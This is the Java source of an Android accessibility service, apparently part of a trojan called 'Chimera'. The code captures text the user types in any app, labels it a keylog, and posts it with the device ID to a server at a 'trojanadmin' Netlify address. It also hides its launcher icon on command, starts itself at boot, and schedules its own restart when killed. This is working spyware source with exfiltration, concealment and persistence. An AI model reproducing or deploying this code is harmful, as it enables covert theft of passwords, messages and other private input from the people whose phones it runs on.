package com.chimera;

import android.accessibilityservice.AccessibilityService;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

public class CoreService extends AccessibilityService {

    private static final String TAG = "CoreService";
    private static final String NETLIFY_SUBMIT_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";

    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "N/A";

    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Intent serviceIntent = new Intent(context, CoreService.class);
                context.startService(serviceIntent);
            }
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        this.requestQueue = Volley.newRequestQueue(getApplicationContext());
        Log.i(TAG, "Ghost protocol engaged. Service is online.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            handleCommand(intent);
        }
        return START_STICKY;
    }

    private void handleCommand(Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        Log.d(TAG, "Received command: " + action);

        switch (action) {
            case "com.chimera.action.TOGGLE_ICON":
                boolean show = intent.getBooleanExtra("show", false);
                handleToggleIcon(show);
                break;
				// Future command handlers will be added here
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                lastForegroundAppPkg = event.getPackageName().toString();
            }
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().toString().isEmpty()) {
                String capturedText = event.getText().toString();
                String log = "App: " + lastForegroundAppPkg + " | Text: " + capturedText;
                submitDataToServer("keylog", log);
            }
        }
    }

    private void handleToggleIcon(boolean show) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, ProvisioningActivity.class);
        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
        Log.i(TAG, "Launcher icon visibility set to: " + (show ? "VISIBLE" : "HIDDEN"));
    }

    private void submitDataToServer(String dataType, Object payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_SUBMIT_URL, postData,
				response -> Log.d(TAG, "Data submitted: " + dataType),
				error -> Log.e(TAG, "Failed to submit '" + dataType + "': " + error.toString())
            );
            requestQueue.add(request);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Service interrupted.");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.w(TAG, "Service unbound. Re-engaging persistence protocols.");
        return super.onUnbind(intent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }
}
